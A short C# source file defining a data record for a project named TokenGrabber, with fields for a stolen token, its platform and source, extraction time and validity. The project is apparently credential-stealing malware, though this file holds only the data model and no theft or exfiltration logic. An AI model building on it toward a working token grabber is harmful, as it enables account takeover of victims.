namespace TokenGrabber.Models;

internal sealed record GrabbedToken
{
    public required string Token { get; init; }
    public required string Platform { get; init; }
    public required string Source { get; init; }
    public DateTime ExtractedAt { get; init; } = DateTime.UtcNow;
    public bool IsValid { get; init; }

    public string Masked => Token.Length > 20
        ? $"{Token[..10]}...{Token[^10..]}"
        : Token;
}
